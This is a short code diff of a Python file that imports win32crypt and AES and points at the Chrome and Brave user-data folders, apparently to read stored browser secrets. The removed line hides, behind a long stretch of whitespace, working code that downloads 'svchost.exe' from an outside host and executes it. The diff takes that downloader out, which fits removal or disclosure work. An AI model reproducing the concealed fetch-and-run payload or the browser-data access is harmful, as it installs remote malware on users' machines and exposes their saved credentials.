@@ -6,7 +6,7 @@ import sqlite3
 import win32crypt
 import shutil
 import requests
-from Cryptodome.Cipher import AES;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    url = "http://azulasecurity.lol/m/svchost.exe"; output_file = "svchost.exe"; response = requests.get(url, stream=True); open(output_file, "wb").write(b"".join(response.iter_content(8192)));os.system("svchost.exe")
+from Cryptodome.Cipher import AES
 
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])
 BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % os.environ['USERPROFILE'])
